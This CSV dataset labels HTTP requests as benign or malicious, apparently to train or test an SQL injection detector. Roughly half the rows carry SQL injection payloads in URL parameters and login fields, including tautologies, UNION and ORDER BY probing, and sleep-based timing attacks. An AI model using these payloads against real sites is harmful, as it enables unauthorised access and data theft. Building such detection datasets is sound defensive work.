text,flow_duration,label
GET /products/home/t,56851,0
GET /search?q=`,4370,1
GET /api/v1/users?id=user1' or 1=1 --,7330,1
"POST /api/v1/cart/add {'item_id': '7024', 'quantity': 1}",83943,0
POST /search {'keyword': '\'},7249,1
POST /profile/update {'email': 'test.user@example.com'},82295,0
GET /assets/css/main.css,75289,0
POST /search {'keyword': 'admin' #'},458,1
POST /profile/update {'email': 'test.user@example.com'},65112,0
GET /blog/posts?page=6,77679,0
GET /images/products/p.jpg,32373,0
GET /user/profile?user_id=``,3991,1
POST /profile/update {'email': 'test.user@example.com'},29411,0
GET /api/v1/users?id=919,16251,0
GET /api/v1/users?id=' OR 1=1--,786,1
GET /search?q=' GROUP BY columnnames having 1=1 --,7818,1
GET /products/details?productID=e,109557,0
"POST /login {'user': '' or 1=1 limit 1 --', 'pass': 'password123'}",54152,1
GET /search?q=' OR 1=1--,7572,1
GET /blog/posts?page=3,39305,0
GET /products/details?productID=J,16131,0
"POST /login {'user': 'x' or 1=1--', 'pass': 'password123'}",60928,1
GET /search?q=' OR 'x'='x,4364,1
GET /search.aspx?q=' AND id IS NULL; --,107419,1
"POST /login {'user': 'z', 'pass': 'password123'}",52204,0
GET /products/details?productID=1' OR '1'='1' --,5959,1
GET /products/details?productID=AND 0,97640,1
GET /search?q=M,77996,0
GET /assets/css/main.css,118608,0
POST /profile/update {'email': 'test.user@example.com'},6943,0
GET /products/home/5,89128,0
POST /profile/update {'email': 'test.user@example.com'},55868,0
GET /images/products/m.jpg,27867,0
"POST /login.php {'username': '1024-2', 'password': 'password'}",3770,1
GET /assets/css/main.css,4286,0
POST /search {'keyword': '' OR 1=1 /*'},2686,1
GET /assets/css/main.css,89038,0
"POST /login {'user': 'C', 'pass': 'password123'}",42406,0
GET /images/products/2.jpg,66924,0
GET /blog/posts?page=19,48904,0
GET /search?q=z,129032,0
"GET /index.php?page=1' ORDER BY 1,2,3--+",69679,1
GET /search?q=j,73988,0
GET /products/home/v,15776,0
"POST /login {'user': 'R', 'pass': 'password123'}",64268,0
GET /search?q=p,59472,0
GET /products/home/P,85841,0
GET /admin/login?user='admin'--,143,1
GET /assets/css/main.css,82699,0
GET /products/home/A,136291,0
POST /profile/update {'email': 'test.user@example.com'},86958,0
GET /user/profile?user_id=1 AND 1=1,122377,1
"POST /login.php {'username': 'x' or 1=1--', 'password': 'password'}",328,1
GET /images/products/b.jpg,47259,0
GET /search.aspx?q=' or 'x'='x,30919,1
GET /images/products/k.jpg,11884,0
GET /admin/login?user='admin'--,7203,1
"POST /login {'user': 'm', 'pass': 'password123'}",73242,0
"POST /login {'user': 'AND true', 'pass': 'password123'}",45061,1
GET /user/profile?user_id=' or 1=1 limit 1 --,106362,1
GET /products/books/X,101704,0
GET /api/v1/users?id=x' or 1=1--,1138,1
"POST /login {'user': '' or 'x'='x', 'pass': 'password123'}",4219,1
GET /index.php?page=' OR 1=1--,114703,1
"POST /api/v1/cart/add {'item_id': '5581', 'quantity': 4}",131466,0
GET /products/details?productID=' AND user IS NULL; --,137847,1
"POST /login {'user': 'v', 'pass': 'password123'}",85452,0
GET /user/profile?user_id=1024-2,928,1
GET /items/show.php?id=' UNION SELECT sum(columnname) from tablename --,128488,1
GET /products/details?productID=X,72146,0
GET /items/show.php?id=' OR 'x'='x,3461,1
GET /api/v1/users?id=8022,43606,0
GET /api/v1/users?id=8545,76040,0
GET /user/profile?user_id=1' ORDER BY 2--+,1968,1
GET /search?q=d,67511,0
GET /api/v1/users?id='',2535,1
GET /api/v1/users?id=1024-2,7808,1
POST /profile/update {'email': 'test.user@example.com'},26869,0
GET /products/books/S,24612,0
"GET /search?q="" OR 1 = 1 -- -",69959,1
GET /products/details?productID=f,68677,0
GET /search?q=E,42293,0
GET /user/profile?user_id=1' OR '1'='1' --,129474,1
"GET /products/details?productID=' AND MID(VERSION(),1,1) = '5';",750,1
GET /items/show.php?id=' or 1=1 limit 1 --,101175,1
GET /api/v1/users?id=6719,65721,0
GET /products/details?productID=r,88008,0
"POST /login {'user': 'n', 'pass': 'password123'}",55701,0
GET /api/v1/users?id=1*1,5663,1
"POST /login {'user': '' or 'x'='x', 'pass': 'password123'}",6455,1
GET /blog/posts?page=10,72692,0
GET /admin/login?user=' OR 1 -- -,129104,1
GET /assets/css/main.css,24172,0
GET /user/profile?user_id=' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --,14691,1
GET /products/details?productID=a,100658,0
GET /search?q=2,30486,0
GET /api/v1/users?id=8493,29059,0
GET /products/details?productID=T,70100,0
GET /api/v1/users?id=4398,61458,0
GET /search.aspx?q=105-1,3077,1
GET /index.php?page=105-1,7068,1
GET /api/v1/users?id=' OR 1=1 /*,2806,1
GET /admin/login?user=user1' or 1=1 --,89949,1
GET /products/home/U,40924,0
"POST /api/v1/cart/add {'item_id': '8132', 'quantity': 5}",74947,0
GET /admin/login?user=1' ORDER BY 1--+,8443,1
GET /search?q=A,51513,0
GET /items/show.php?id=' OR 1=1--,65753,1
POST /search {'keyword': '1' and '1'='1'},5435,1
"POST /api/v1/cart/add {'item_id': '9378', 'quantity': 4}",6619,0
GET /products/details?productID=1 AND 1=1,121400,1
GET /assets/css/main.css,31125,0
GET /products/details?productID=F,2320,0
"POST /login {'user': '1' OR '1'='1' --', 'pass': 'password123'}",143851,1
GET /admin/login?user=' OR 'x'='x,7984,1
GET /products/details?productID=user1' or 1=1 --,129740,1
"GET /items/show.php?id=1' GROUP BY 1,2,--+",6458,1
POST /profile/update {'email': 'test.user@example.com'},67961,0
POST /search {'keyword': '' OR '1'='1'},78038,1
"POST /api/v1/cart/add {'item_id': '9202', 'quantity': 4}",59294,0
GET /images/products/k.jpg,126838,0
GET /search?q=h,14708,0
"POST /api/v1/cart/add {'item_id': '7729', 'quantity': 5}",68877,0
"POST /login {'user': 'e', 'pass': 'password123'}",34049,0
"POST /login {'user': '105-1', 'pass': 'password123'}",79087,1
GET /products/details?productID=5,85235,0
"POST /login {'user': 'OR 1=1', 'pass': 'password123'}",122136,1
GET /products/details?productID=e,78135,0
"GET /user/profile?user_id=1' GROUP BY 1,2,--+",6323,1
GET /products/details?productID=x' or 1=1--,5510,1
GET /products/electronics/B,96102,0
GET /search?q=y,15342,0
GET /products/books/O,66228,0
GET /index.php?page=%2c(select%20*%20from%20(select(sleep(10)))a),132209,1
GET /index.php?page=105-1,21403,1
GET /products/details?productID=y,93222,0
GET /search?q=1024-2,79733,1
GET /images/products/i.jpg,73871,0
GET /user/profile?user_id=' OR '1'='1,26923,1
"POST /api/v1/cart/add {'item_id': '6936', 'quantity': 4}",7534,0
"GET /admin/login?user=1' ORDER BY 1,2,3--+",41939,1
GET /products/details?productID=G,29464,0
POST /profile/update {'email': 'test.user@example.com'},38393,0
POST /profile/update {'email': 'test.user@example.com'},57534,0
GET /assets/css/main.css,64016,0
GET /search?q=U,83239,0
"POST /login {'user': '1024-2', 'pass': 'password123'}",116993,1
"GET /user/profile?user_id="" OR """" = """,4138,1
GET /assets/css/main.css,65907,0
GET /items/show.php?id=1=1,94332,1
"POST /login {'user': '' OR 'x'='x', 'pass': 'password123'}",5793,1
GET /admin/login?user=1024-2,156,1
GET /api/v1/users?id=1 AND 1=1,39864,1
GET /search?q=OR+%271%27%3D%271,6956,1
GET /products/details?productID=OR+%271%27%3D%271,18198,1
GET /user/profile?user_id='admin'--,21999,1
"GET /products/details?productID="" OR """" = """,2298,1
"POST /api/v1/cart/add {'item_id': '2827', 'quantity': 4}",82580,0
GET /images/products/b.jpg,94177,0
GET /products/electronics/V,64612,0
GET /api/v1/users?id=' OR '1'='1,127786,1
GET /api/v1/users?id=1024-2,36614,1
GET /products/details?productID=1 AND 1=1,3548,1
GET /api/v1/users?id=9495,66935,0
"POST /login {'user': '1=1', 'pass': 'password123'}",130096,1
"POST /login {'user': '1 AND 1=1', 'pass': 'password123'}",60775,1
POST /profile/update {'email': 'test.user@example.com'},76640,0
"POST /login {'user': 'Q', 'pass': 'password123'}",47896,0
GET /search?q=' OR 1=1 /*,3286,1
GET /images/products/n.jpg,4926,0
POST /profile/update {'email': 'test.user@example.com'},56965,0
GET /search?q=admin' #,2357,1
GET /search?q=' or 'x'='x,12060,1
"POST /login {'user': '1' ORDER BY 1,2,3--+', 'pass': 'password123'}",7859,1
"POST /login {'user': '1 AND 1=1', 'pass': 'password123'}",3807,1
POST /profile/update {'email': 'test.user@example.com'},57344,0
GET /images/products/b.jpg,20495,0
GET /search?q=Z,53001,0
"GET /search.aspx?q="" OR """" = """,5320,1
GET /api/v1/users?id=8485,51683,0
GET /search?q=1024-2,4710,1
GET /products/details?productID=' OR '1'='1,37107,1
GET /search?q=B,99391,0
GET /products/books/e,94973,0
POST /search {'keyword': 'smith' OR '1'='1'},127333,1
GET /products/home/T,67391,0
GET /index.php?page=1 AND 1=1,105610,1
GET /images/products/q.jpg,149556,0
GET /user/profile?user_id=' or 1=1 limit 1 --,4567,1
"POST /api/v1/cart/add {'item_id': '1291', 'quantity': 4}",6672,0
GET /search?q=H,125180,0
GET /images/products/x.jpg,65197,0
"POST /login.php {'username': ''''''''''''''UNION SELECT '2', 'password': 'password'}",1407,1
"POST /login {'user': 'f', 'pass': 'password123'}",12237,0
GET /search?q=' OR '1'='1,23985,1
"POST /login.php {'username': 'smith' OR '1'='1', 'password': 'password'}",55235,1
GET /items/show.php?id=' OR 'x'='x,122396,1
"POST /search {'keyword': '' AND MID(VERSION(),1,1) = '5';'}",6456,1
GET /images/products/m.jpg,23595,0
GET /search?q=1' ORDER BY 3--+,2678,1
GET /api/v1/users?id=1882,26631,0
GET /blog/posts?page=3,22004,0
GET /user/profile?user_id=' OR 1=1 /*,5965,1
GET /api/v1/users?id=1' and '1'='1,4077,1
GET /products/home/Q,27132,0
GET /images/products/Z.jpg,11876,0
POST /profile/update {'email': 'test.user@example.com'},88951,0
"POST /login {'user': '1*56', 'pass': 'password123'}",2010,1
GET /api/v1/users?id=' or 1=1 limit 1 --,5316,1
GET /api/v1/users?id=1994,9706,0
GET /search?q=x' or 1=1--,3914,1
POST /search {'keyword': 'user1' or 1=1 --'},102547,1
POST /profile/update {'email': 'test.user@example.com'},108161,0
GET /images/products/8.jpg,14492,0
GET /search?q=1*1,415,1
"POST /api/v1/cart/add {'item_id': '9541', 'quantity': 3}",80127,0
GET /products/details?productID=k,30856,0
GET /api/v1/users?id=8590,28179,0
GET /search?q=4,31884,0
GET /assets/css/main.css,18553,0
GET /images/products/A.jpg,101327,0
GET /user/profile?user_id=1024-2,77789,1
GET /api/v1/users?id='admin'--,65793,1
GET /api/v1/users?id=1-false,106428,1
GET /products/details?productID=i,40534,0
GET /products/details?productID=Q,24091,0
GET /index.php?page='admin'--,5279,1
"POST /login {'user': '1*1', 'pass': 'password123'}",4376,1
GET /api/v1/users?id=' or 'x'='x,7596,1
GET /api/v1/users?id=\,3738,1
"POST /login {'user': ''admin'--', 'pass': 'password123'}",140146,1
"POST /login {'user': 'o', 'pass': 'password123'}",15251,0
"POST /login.php {'username': 'OR+%271%27%3D%271', 'password': 'password'}",889,1
GET /api/v1/users?id=8020,74416,0
POST /search {'keyword': 'admin' #'},3521,1
"POST /login {'user': 'w', 'pass': 'password123'}",54698,0
"POST /api/v1/cart/add {'item_id': '5122', 'quantity': 3}",97627,0
GET /search?q=B,75623,0
GET /search?q=g,77947,0
GET /products/details?productID=-2,2326,1
GET /products/books/9,86643,0
GET /index.php?page=OR '1'='1',4125,1
"GET /api/v1/users?id=""",7458,1
GET /search?q='admin'--,86743,1
POST /profile/update {'email': 'test.user@example.com'},31259,0
"POST /login {'user': 'user1' or 1=1 --', 'pass': 'password123'}",78162,1
GET /images/products/u.jpg,25204,0
"POST /login {'user': '1' and '1'='1', 'pass': 'password123'}",64338,1
"POST /login {'user': 'N', 'pass': 'password123'}",115915,0
GET /api/v1/users?id=1=1,2937,1
"POST /login {'user': '5', 'pass': 'password123'}",44620,0
GET /items/show.php?id='admin'--,8303,1
GET /search?q=1024-2,143542,1
GET /products/details?productID=user1' or 1=1 --,5099,1
POST /search {'keyword': 'OR '1'='1''},49657,1
GET /api/v1/users?id=1' OR '1'='1' --,86945,1
GET /products/home/W,50031,0
GET /blog/posts?page=19,54207,0
GET /products/details?productID=' or 'x'='x,78715,1
GET /index.php?page=' or 'x'='x,2648,1
GET /products/details?productID=u,57362,0
POST /profile/update {'email': 'test.user@example.com'},61386,0
"POST /login {'user': '``', 'pass': 'password123'}",39785,1
GET /assets/css/main.css,30075,0
"POST /login {'user': '5', 'pass': 'password123'}",137392,0
GET /admin/login?user=1' and '1'='1,1333,1
POST /search {'keyword': 'AND 1'},48183,1
"POST /login {'user': 'M', 'pass': 'password123'}",15430,0
GET /index.php?page=%00,3975,1
GET /api/v1/users?id=1 AND 1=1,22115,1
"POST /login {'user': 'g', 'pass': 'password123'}",61801,0
GET /assets/css/main.css,26257,0
GET /images/products/C.jpg,65847,0
GET /api/v1/users?id=smith' OR '1'='1,92165,1
GET /assets/css/main.css,123572,0
GET /user/profile?user_id=' OR 'x'='x,66038,1
"POST /login {'user': '1' ORDER BY 3--+', 'pass': 'password123'}",2741,1
GET /assets/css/main.css,3133,0
POST /profile/update {'email': 'test.user@example.com'},42437,0
GET /products/details?productID=z,55164,0
GET /search?q=-2,6540,1
"GET /api/v1/users?id=""""",1860,1
POST /profile/update {'email': 'test.user@example.com'},146643,0
GET /products/details?productID=OR '1'='1',50889,1
"POST /login {'user': '7', 'pass': 'password123'}",7131,0
GET /products/details?productID=';WAITFOR DELAY '0:0:30'--,93650,1
GET /search?q=OR 1=1,117570,1
"POST /login.php {'username': 'smith' OR '1'='1', 'password': 'password'}",113857,1
GET /search?q=x' or 1=1--,1592,1
GET /products/details?productID='=0--+,6285,1
GET /search?q=t,147059,0
GET /user/profile?user_id=//,139004,1
GET /index.php?page=' or 'x'='x,3766,1
"POST /login {'user': 'x' or 1=1--', 'pass': 'password123'}",1282,1
GET /products/details?productID='admin'--,2269,1
GET /products/details?productID=V,41532,0
"POST /api/v1/cart/add {'item_id': '6493', 'quantity': 4}",130871,0
GET /api/v1/users?id=4309,55724,0
POST /profile/update {'email': 'test.user@example.com'},103244,0
GET /products/details?productID=1*1,43727,1
"POST /login {'user': '' or 'x'='x', 'pass': 'password123'}",8123,1
GET /products/details?productID=' AND user IS NULL; --,3263,1
"POST /login.php {'username': ''admin'--', 'password': 'password'}",70974,1
GET /search?q=G,41812,0
GET /products/details?productID=8,17777,0
GET /products/details?productID=1*1,71974,1
GET /index.php?page=-2,417,1
POST /search {'keyword': '1 AND (SELECT * FROM Users) = 1'},77385,1
POST /profile/update {'email': 'test.user@example.com'},48305,0
GET /blog/posts?page=1,117416,0
"POST /login.php {'username': '1024-2', 'password': 'password'}",6536,1
GET /search?q=OR 1=1,113235,1
GET /products/details?productID='LIKE',4092,1
GET /api/v1/users?id=admin' #,3584,1
GET /api/v1/users?id=1 AND 1=1,35237,1
GET /search?q=g,12390,0
POST /profile/update {'email': 'test.user@example.com'},21015,0
GET /user/profile?user_id=\\,5270,1
GET /items/show.php?id=smith' OR '1'='1,2877,1
GET /index.php?page=user1' or 1=1 --,405,1
GET /products/details?productID=' OR 'x'='x,915,1
GET /products/details?productID=s,67915,0
POST /profile/update {'email': 'test.user@example.com'},5718,0
POST /search {'keyword': 'admin' #'},69370,1
GET /index.php?page=1' OR '1'='1' --,3985,1
POST /profile/update {'email': 'test.user@example.com'},40417,0
GET /admin/login?user=' OR 'x'='x,4787,1
GET /api/v1/users?id=' or 'x'='x,148924,1
GET /api/v1/users?id=5187,51331,0
GET /blog/posts?page=6,98841,0
GET /api/v1/users?id=smith' OR '1'='1,4811,1
"POST /login.php {'username': '' AND id IS NULL; --', 'password': 'password'}",56032,1
GET /api/v1/users?id=OR+%271%27%3D%271,90616,1
"POST /api/v1/cart/add {'item_id': '3647', 'quantity': 4}",7595,0
POST /search {'keyword': '1' OR '1'='1' --'},17102,1
"POST /login.php {'username': ''admin'--', 'password': 'password'}",102734,1
GET /products/books/p,7309,0
GET /api/v1/users?id=640,49052,0
"POST /login {'user': 'J', 'pass': 'password123'}",143611,0
"POST /login {'user': 'A', 'pass': 'password123'}",82048,0
GET /search.aspx?q=OR '1'='1',1669,1
"POST /login {'user': '1' OR '1'='1' --', 'pass': 'password123'}",3056,1
GET /api/v1/users?id=1300,100490,0
GET /admin/login?user=1*56,133987,1
GET /search?q=r,30814,0
GET /assets/css/main.css,81781,0
GET /search?q=y,82874,0
GET /products/details?productID=H,29946,0
POST /search {'keyword': '1*1'},136807,1
"POST /login.php {'username': '1-false', 'password': 'password'}",1834,1
GET /products/details?productID=C,38331,0
GET /products/details?productID=B,1857,0
GET /api/v1/users?id=185,19999,0
POST /search {'keyword': ''admin'--'},127768,1
GET /items/show.php?id=1' ORDER BY 1--+,3183,1
GET /index.php?page=1 AND (SELECT * FROM Users) = 1,7834,1
"POST /login.php {'username': '1*1', 'password': 'password'}",4058,1
"POST /login {'user': 'smith' OR '1'='1', 'pass': 'password123'}",101012,1
GET /assets/css/main.css,55144,0
"POST /login {'user': '' OR 1=1--', 'pass': 'password123'}",4453,1
GET /api/v1/users?id=' OR 1=1 /*,61585,1
GET /products/home/Z,85786,0
GET /api/v1/users?id=8186,15167,0
GET /images/products/s.jpg,11298,0
"POST /login {'user': '7', 'pass': 'password123'}",25324,0
GET /blog/posts?page=11,76003,0
"POST /api/v1/cart/add {'item_id': '2907', 'quantity': 5}",77687,0
GET /index.php?page=user1' or 1=1 --,74548,1
GET /api/v1/users?id=3902,5249,0
"GET /search.aspx?q=,(select * from (select(sleep(10)))a)",2960,1
"GET /api/v1/users?id=,",5684,1
GET /api/v1/users?id=' GROUP BY columnnames having 1=1 --,132654,1
GET /api/v1/users?id=7432,62608,0
GET /index.php?page=OR+%271%27%3D%271,3222,1
"POST /api/v1/cart/add {'item_id': '6668', 'quantity': 1}",13130,0
"POST /login.php {'username': '' OR 1=1--', 'password': 'password'}",81311,1
GET /products/details?productID=' OR 'x'='x,5805,1
"POST /login {'user': '1 AND (SELECT * FROM Users) = 1', 'pass': 'password123'}",5066,1
GET /api/v1/users?id=' OR 1=1 /*,3636,1
